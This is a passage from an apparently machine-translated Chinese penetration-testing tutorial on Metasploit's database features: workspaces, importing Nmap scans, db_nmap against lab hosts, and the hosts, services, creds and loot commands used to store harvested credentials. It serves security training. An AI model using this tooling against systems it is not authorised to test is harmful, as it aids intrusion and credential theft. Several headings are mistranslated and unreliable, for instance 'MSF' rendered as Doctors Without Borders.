数据库选项</h4><p> MSF - 数据库选项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; help database</span><br><span class="line"></span><br><span class="line">Database Backend Commands</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">    Command           Description</span><br><span class="line">    -------           -----------</span><br><span class="line">    db_connect        Connect to an existing database</span><br><span class="line">    db_disconnect     Disconnect from the current database instance</span><br><span class="line">    db_export         Export a file containing the contents of the database</span><br><span class="line">    db_import         Import a scan result file (filetype will be auto-detected)</span><br><span class="line">    db_nmap           Executes nmap and records the output automatically</span><br><span class="line">    db_rebuild_cache  Rebuilds the database-stored module cache</span><br><span class="line">    db_status         Show the current database status</span><br><span class="line">    hosts             List all hosts in the database</span><br><span class="line">    loot              List all loot in the database</span><br><span class="line">    notes             List all notes in the database</span><br><span class="line">    services          List all services in the database</span><br><span class="line">    vulns             List all vulnerabilities in the database</span><br><span class="line">    workspace         Switch between database workspaces</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; db_status</span><br><span class="line"></span><br><span class="line">[*] Connected to msf. Connection type: postgresql.</span><br></pre></td></tr></table></figure><hr><h2 id="使用数据库"><a href="#使用数据库" class="headerlink" title="使用数据库"></a>使用数据库</h2><p>在数据库的帮助下，我们可以管理我们分析过的许多不同的类别和主机。或者，我们使用 Metasploit 与之交互的有关它们的信息。这些数据库可以导出和导入。当我们有大量的主机列表、战利品、注释和这些主机的存储漏洞时，这尤其有用。确认数据库连接成功后，我们就可以组织我们的<code>Workspaces</code>.</p><h4 id="工作区"><a href="#工作区" class="headerlink" title="工作区"></a>工作区</h4><p>我们可以<code>Workspaces</code>像考虑项目中的文件夹一样考虑。我们可以按 IP、子网、网络或域隔离不同的扫描结果、主机和提取的信息。</p><p>要查看当前工作区列表，请使用<code>workspace</code>命令。在命令后添加<code>-a</code>or开关，后跟工作空间的名称，将把工作空间或该工作空间添加到数据库中。<code>-d``add``delete</code></p><p> 工作区</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; workspace</span><br><span class="line"></span><br><span class="line">* default</span><br></pre></td></tr></table></figure><p>请注意，默认工作区已<code>default</code>根据<code>*</code>符号命名并且当前正在使用中。键入<code>workspace [name]</code>命令以切换当前使用的工作区。回顾我们的示例，让我们为此评估创建一个工作区并选择它。</p><p> 工作区</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; workspace -a Target_1</span><br><span class="line"></span><br><span class="line">[*] Added workspace: Target_1</span><br><span class="line">[*] Workspace: Target_1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; workspace Target_1 </span><br><span class="line"></span><br><span class="line">[*] Workspace: Target_1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; workspace</span><br><span class="line"></span><br><span class="line">  default</span><br><span class="line">* Target_1</span><br></pre></td></tr></table></figure><p>要查看我们还可以使用 Workspaces 做什么，我们可以使用<code>workspace -h</code>与 Workspaces 相关的帮助菜单的命令。</p><p> 工作区</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; workspace -h</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">    workspace                  List workspaces</span><br><span class="line">    workspace -v               List workspaces verbosely</span><br><span class="line">    workspace [name]           Switch workspace</span><br><span class="line">    workspace -a [name] ...    Add workspace(s)</span><br><span class="line">    workspace -d [name] ...    Delete workspace(s)</span><br><span class="line">    workspace -D               Delete all workspaces</span><br><span class="line">    workspace -r     Rename workspace</span><br><span class="line">    workspace -h               Show this help information</span><br></pre></td></tr></table></figure><hr><h2 id="导入扫描结果"><a href="#导入扫描结果" class="headerlink" title="导入扫描结果"></a>导入扫描结果</h2><p>接下来，让我们假设我们想要将<code>Nmap scan</code>主机的一个导入到我们的数据库的工作区中，以便更好地了解目标。我们可以<code>db_import</code>为此使用命令。导入完成后，我们可以使用<code>hosts</code>和<code>services</code>命令检查数据库中主机信息的存在。请注意，<code>.xml</code>文件类型首选<code>db_import</code>.</p><h4 id="存储-Nmap-扫描"><a href="#存储-Nmap-扫描" class="headerlink" title="存储 Nmap 扫描"></a>存储 Nmap 扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ cat Target.nmap</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 20:54 UTC</span><br><span class="line">Nmap scan report for 10.10.10.40</span><br><span class="line">Host is up (0.017s latency).</span><br><span class="line">Not shown: 991 closed ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 60.81 seconds</span><br></pre></td></tr></table></figure><h4 id="导入扫描结果-1"><a href="#导入扫描结果-1" class="headerlink" title="导入扫描结果"></a>导入扫描结果</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_import Target.xml</span><br><span class="line"></span><br><span class="line">[*] Importing &#x27;Nmap XML&#x27; data</span><br><span class="line">[*] Import: Parsing with &#x27;Nokogiri v1.10.9&#x27;</span><br><span class="line">[*] Importing host 10.10.10.40</span><br><span class="line">[*] Successfully imported ~/Target.xml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; hosts</span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">=====</span><br><span class="line"></span><br><span class="line">address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments</span><br><span class="line">-------      ---  ----  -------  ---------  -----  -------  ----  --------</span><br><span class="line">10.10.10.40             Unknown                    device         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; services</span><br><span class="line"></span><br><span class="line">Services</span><br><span class="line">========</span><br><span class="line"></span><br><span class="line">host         port   proto  name          state  info</span><br><span class="line">----         ----   -----  ----          -----  ----</span><br><span class="line">10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn</span><br><span class="line">10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP</span><br><span class="line">10.10.10.40  49152  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49153  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49154  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49155  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49156  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49157  tcp    msrpc         open   Microsoft Windows RPC</span><br></pre></td></tr></table></figure><h2 id="在-MSF-控制台中使用-Nmap"><a href="#在-MSF-控制台中使用-Nmap" class="headerlink" title="在 MSF 控制台中使用 Nmap"></a>在 MSF 控制台中使用 Nmap</h2><p>或者，我们可以直接从 msfconsole 使用 Nmap！要直接从控制台扫描而无需后台或退出进程，请使用命令<code>db_nmap</code>。</p><h4 id="无国界医生-Nmap"><a href="#无国界医生-Nmap" class="headerlink" title="无国界医生-Nmap"></a>无国界医生-Nmap</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_nmap -sV -sS 10.10.10.8</span><br><span class="line"></span><br><span class="line">[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 21:04 UTC</span><br><span class="line">[*] Nmap: Nmap scan report for 10.10.10.8</span><br><span class="line">[*] Nmap: Host is up (0.016s latency).</span><br><span class="line">[*] Nmap: Not shown: 999 filtered ports</span><br><span class="line">[*] Nmap: PORT   STATE SERVICE VERSION</span><br><span class="line">[*] Nmap: 80/TCP open  http    HttpFileServer httpd 2.3</span><br><span class="line">[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line">[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ </span><br><span class="line">[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 11.12 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; hosts</span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">=====</span><br><span class="line"></span><br><span class="line">address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments</span><br><span class="line">-------      ---  ----  -------  ---------  -----  -------  ----  --------</span><br><span class="line">10.10.10.8              Unknown                    device         </span><br><span class="line">10.10.10.40             Unknown                    device         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; services</span><br><span class="line"></span><br><span class="line">Services</span><br><span class="line">========</span><br><span class="line"></span><br><span class="line">host         port   proto  name          state  info</span><br><span class="line">----         ----   -----  ----          -----  ----</span><br><span class="line">10.10.10.8   80     tcp    http          open   HttpFileServer httpd 2.3</span><br><span class="line">10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn</span><br><span class="line">10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP</span><br><span class="line">10.10.10.40  49152  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49153  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49154  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49155  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49156  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49157  tcp    msrpc         open   Microsoft Windows RPC</span><br></pre></td></tr></table></figure><h2 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h2><p>会话结束后，如果 PostgreSQL 服务出现任何问题，请务必备份我们的数据。为此，请使用<code>db_export</code>命令。</p><h4 id="MSF-数据库导出"><a href="#MSF-数据库导出" class="headerlink" title="MSF - 数据库导出"></a>MSF - 数据库导出</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_export -h</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">    db_export -f &lt;format&gt; [filename]</span><br><span class="line">    Format can be one of: xml, pwdump</span><br><span class="line">[-] No output file was specified</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; db_export -f xml backup.xml</span><br><span class="line"></span><br><span class="line">[*] Starting export of workspace default to backup.xml [ xml ]...</span><br><span class="line">[*] Finished export of workspace default to backup.xml [ xml ]...</span><br></pre></td></tr></table></figure><p>以后需要时可以将此数据导回 msfconsole。<code>hosts</code>其他与数据保留相关的命令是、<code>services</code>、<code>creds</code>和命令的扩展使用<code>loot</code>。</p><h2 id="主持"><a href="#主持" class="headerlink" title="主持"></a>主持</h2><p>该<code>hosts</code>命令显示一个数据库表，该表自动填充了主机地址、主机名以及我们在扫描和交互过程中找到的有关这些信息的其他信息。例如，假设<code>msfconsole</code>与可以执行服务和操作系统检测的扫描仪插件链接。在这种情况下，一旦通过 msfconsole 完成扫描，该信息就会自动出现在表中。同样，Nessus、NexPose 或 Nmap 等工具将在这些情况下为我们提供帮助。</p><p>主机也可以手动添加为该表中的单独条目。添加我们的自定义主机后，我们还可以组织表格的格式和结构、添加评论、更改现有信息等等。</p><h4 id="MSF-存储主机"><a href="#MSF-存储主机" class="headerlink" title="MSF - 存储主机"></a>MSF - 存储主机</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; hosts -h</span><br><span class="line"></span><br><span class="line">Usage: hosts [ options ] [addr1 addr2 ...]</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line">  -a,--add          Add the hosts instead of searching</span><br><span class="line">  -d,--delete       Delete the hosts instead of searching</span><br><span class="line">  -c &lt;col1,col2&gt;    Only show the given columns (see list below)</span><br><span class="line">  -C &lt;col1,col2&gt;    Only show the given columns until the next restart (see list below)</span><br><span class="line">  -h,--help         Show this help information</span><br><span class="line">  -u,--up           Only show hosts which are up</span><br><span class="line">  -o &lt;file&gt;         Send output to a file in CSV format</span><br><span class="line">  -O &lt;column&gt;       Order rows by specified column number</span><br><span class="line">  -R,--rhosts       Set RHOSTS from the results of the search</span><br><span class="line">  -S,--search       Search string to filter by</span><br><span class="line">  -i,--info         Change the info of a host</span><br><span class="line">  -n,--name         Change the name of a host</span><br><span class="line">  -m,--comment      Change the comment of a host</span><br><span class="line">  -t,--tag          Add or specify a tag to a range of hosts</span><br><span class="line"></span><br><span class="line">Available columns: address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, note_count, os_family, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count, tags</span><br></pre></td></tr></table></figure><h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><p>该<code>services</code>命令的功能与前一个命令相同。它包含一个表格，其中包含有关在扫描或交互过程中发现的服务的描述和信息。与上面的命令一样，这里的条目是高度可定制的。</p><h4 id="MSF-主机的存储服务"><a href="#MSF-主机的存储服务" class="headerlink" title="MSF - 主机的存储服务"></a>MSF - 主机的存储服务</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; services -h</span><br><span class="line"></span><br><span class="line">Usage: services [-h] [-u] [-a] [-r &lt;proto&gt;] [-p &lt;port1,port2&gt;] [-s &lt;name1,name2&gt;] [-o &lt;filename&gt;] [addr1 addr2 ...]</span><br><span class="line"></span><br><span class="line">  -a,--add          Add the services instead of searching</span><br><span class="line">  -d,--delete       Delete the services instead of searching</span><br><span class="line">  -c &lt;col1,col2&gt;    Only show the given columns</span><br><span class="line">  -h,--help         Show this help information</span><br><span class="line">  -s &lt;name&gt;         Name of the service to add</span><br><span class="line">  -p &lt;port&gt;         Search for a list of ports</span><br><span class="line">  -r &lt;protocol&gt;     Protocol type of the service being added [tcp|udp]</span><br><span class="line">  -u,--up           Only show services which are up</span><br><span class="line">  -o &lt;file&gt;         Send output to a file in csv format</span><br><span class="line">  -O &lt;column&gt;       Order rows by specified column number</span><br><span class="line">  -R,--rhosts       Set RHOSTS from the results of the search</span><br><span class="line">  -S,--search       Search string to filter by</span><br><span class="line">  -U,--update       Update data for existing service</span><br><span class="line"></span><br><span class="line">Available columns: created_at, info, name, port, proto, state, updated_at</span><br></pre></td></tr></table></figure><h2 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h2><p>该<code>creds</code>命令允许您可视化在与目标主机交互期间收集的凭据。我们还可以手动添加凭据，将现有凭据与端口规范匹配，添加描述等。</p><h4 id="MSF-存储凭证"><a href="#MSF-存储凭证" class="headerlink" title="MSF - 存储凭证"></a>MSF - 存储凭证</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; creds -h</span><br><span class="line"></span><br><span class="line">With no sub-command, list credentials. If an address range is</span><br><span class="line">given, show only credentials with logins on hosts within that</span><br><span class="line">range.</span><br><span class="line"></span><br><span class="line">Usage - Listing credentials:</span><br><span class="line">  creds [filter options] [address range]</span><br><span class="line"></span><br><span class="line">Usage - Adding credentials:</span><br><span class="line">  creds add uses the following named parameters.</span><br><span class="line">    user      :  Public, usually a username</span><br><span class="line">    password  :  Private, private_type Password.</span><br><span class="line">    ntlm      :  Private, private_type NTLM Hash.</span><br><span class="line">    Postgres  :  Private, private_type Postgres MD5</span><br><span class="line">    ssh-key   :  Private, private_type SSH key, must be a file path.</span><br><span class="line">    hash      :  Private, private_type Nonreplayable hash</span><br><span class="line">    jtr       :  Private, private_type John the Ripper hash type.</span><br><span class="line">    realm     :  Realm, </span><br><span class="line">    realm-type:  Realm, realm_type (domain db2db sid pgdb rsync wildcard), defaults to domain.</span><br><span class="line"></span><br><span class="line">Examples: Adding</span><br><span class="line">   # Add a user, password and realm</span><br><span class="line">   creds add user:admin password:notpassword realm:workgroup</span><br><span class="line">   # Add a user and password</span><br><span class="line">   creds add user:guest password:&#x27;guest password&#x27;</span><br><span class="line">   # Add a password</span><br><span class="line">   creds add password:&#x27;password without username&#x27;</span><br><span class="line">   # Add a user with an NTLMHash</span><br><span class="line">   creds add user:admin ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A</span><br><span class="line">   # Add a NTLMHash</span><br><span class="line">   creds add ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A</span><br><span class="line">   # Add a Postgres MD5</span><br><span class="line">   creds add user:postgres postgres:md5be86a79bf2043622d58d5453c47d4860</span><br><span class="line">   # Add a user with an SSH key</span><br><span class="line">   creds add user:sshadmin ssh-key:/path/to/id_rsa</span><br><span class="line">   # Add a user and a NonReplayableHash</span><br><span class="line">   creds add user:other hash:d19c32489b870735b5f587d76b934283 jtr:md5</span><br><span class="line">   # Add a NonReplayableHash</span><br><span class="line">   creds add hash:d19c32489b870735b5f587d76b934283</span><br><span class="line"></span><br><span class="line">General options</span><br><span class="line">  -h,--help             Show this help information</span><br><span class="line">  -o &lt;file&gt;             Send output to a file in csv/jtr (john the ripper) format.</span><br><span class="line">                        If the file name ends in &#x27;.jtr&#x27;, that format will be used.</span><br><span class="line">                        If file name ends in &#x27;.hcat&#x27;, the hashcat format will be used.</span><br><span class="line">                        CSV by default.</span><br><span class="line">  -d,--delete           Delete one or more credentials</span><br><span class="line"></span><br><span class="line">Filter options for listing</span><br><span class="line">  -P,--password &lt;text&gt;  List passwords that match this text</span><br><span class="line">  -p,--port &lt;portspec&gt;  List creds with logins on services matching this port spec</span><br><span class="line">  -s &lt;svc names&gt;        List creds matching comma-separated service names</span><br><span class="line">  -u,--user &lt;text&gt;      List users that match this text</span><br><span class="line">  -t,--type &lt;type&gt;      List creds that match the following types: password,ntlm,hash</span><br><span class="line">  -O,--origins &lt;IP&gt;     List creds that match these origins</span><br><span class="line">  -R,--rhosts           Set RHOSTS from the results of the search</span><br><span class="line">  -v,--verbose          Don&#x27;t truncate long password hashes</span><br><span class="line"></span><br><span class="line">Examples, John the Ripper hash types:</span><br><span class="line">  Operating Systems (starts with)</span><br><span class="line">    Blowfish ($2a$)   : bf</span><br><span class="line">    BSDi     (_)      : bsdi</span><br><span class="line">    DES               : des,crypt</span><br><span class="line">    MD5      ($1$)    : md5</span><br><span class="line">    SHA256   ($5$)    : sha256,crypt</span><br><span class="line">    SHA512   ($6$)    : sha512,crypt</span><br><span class="line">  Databases</span><br><span class="line">    MSSQL             : mssql</span><br><span class="line">    MSSQL 2005        : mssql05</span><br><span class="line">    MSSQL 2012/2014   : mssql12</span><br><span class="line">    MySQL &lt; 4.1       : mysql</span><br><span class="line">    MySQL &gt;= 4.1      : mysql-sha1</span><br><span class="line">    Oracle            : des,oracle</span><br><span class="line">    Oracle 11         : raw-sha1,oracle11</span><br><span class="line">    Oracle 11 (H type): dynamic_1506</span><br><span class="line">    Oracle 12c        : oracle12c</span><br><span class="line">    Postgres          : postgres,raw-md5</span><br><span class="line"></span><br><span class="line">Examples, listing:</span><br><span class="line">  creds               # Default, returns all credentials</span><br><span class="line">  creds 1.2.3.4/24    # Return credentials with logins in this range</span><br><span class="line">  creds -O 1.2.3.4/24 # Return credentials with origins in this range</span><br><span class="line">  creds -p 22-25,445  # nmap port specification</span><br><span class="line">  creds -s ssh,smb    # All creds associated with a login on SSH or SMB services</span><br><span class="line">  creds -t NTLM       # All NTLM creds</span><br><span class="line">  creds -j md5        # All John the Ripper hash type MD5 creds</span><br><span class="line"></span><br><span class="line">Example, deleting:</span><br><span class="line">  # Delete all SMB credentials</span><br><span class="line">  creds -d -s smb</span><br></pre></td></tr></table></figure><h2 id="抢劫"><a href="#抢劫" class="headerlink" title="抢劫"></a>抢劫</h2><p>该<code>loot</code>命令与上面的命令结合使用，为您提供拥有的服务和用户的一目了然的列表。在这种情况下，战利品指的是来自不同系统类型的哈希转储，即哈希、密码、影子等。</p><h4 id="MSF–-存储战利品"><a href="#MSF–-存储战利品" class="headerlink" title="MSF– 存储战利品"></a>MSF– 存储战利品</h4><p> MSF– 存储战利品</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; loot -h</span><br><span class="line"></span><br><span class="line">Usage: loot [options]</span><br><span class="line"> Info: loot [-h] [addr1 addr2 ...] [-t &lt;type1,type2&gt;]</span><br><span class="line">  Add: loot -f [fname] -i [info] -a [addr1 addr2 ...] -t [type]</span><br><span class="line">  Del: loot -d [addr1 addr2 ...]</span><br><span class="line"></span><br><span class="line">  -a,--add          Add loot to the list of addresses, instead of listing</span><br><span class="line">  -d,--delete       Delete *all* loot matching host and type</span><br><span class="line">  -f,--file         File with contents of the loot to add</span><br><span class="line">  -i,--info         Info of the loot to add</span><br><span class="line">  -t &lt;type1,type2&gt;  Search for a list of types</span><br><span class="line">  -h,--help         Show this help information</span><br><span class="line">  -S,--search       Search string to filter by</span><br></pre></td></tr></table></figure><h2 id="插件-1"><a href="#插件-1" class="headerlink" title="插件"></a>插件</h2><p>插件是第三方已经发布的现成软件，并已批准 Metasploit 的创建者将他们的软件集成到框架中。这些可以代表免费使用但功能有限的商业产品<code>Community Edition</code>，或者它们可以是由个人开发的个人项目。</p><p>插件的使用使渗透测试人员的生活更加轻松，将知名软件的功能带入<code>msfconsole</code>Metasploit Pro 环境。以前，我们需要在不同的软件之间循环导入和导出结果，一遍又一遍地设置选项和参数，现在，通过使用插件，msfconsole 会自动将所有内容记录到我们正在使用的数据库以及主机、服务和漏洞一目了然供用户使用。<a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Plugin">插件</a>直接与 API 一起工作，可用于操作整个框架。它们可用于自动执行重复性任务、向 中添加新命令<code>msfconsole</code>以及扩展已经很强大的框架。</p><h3 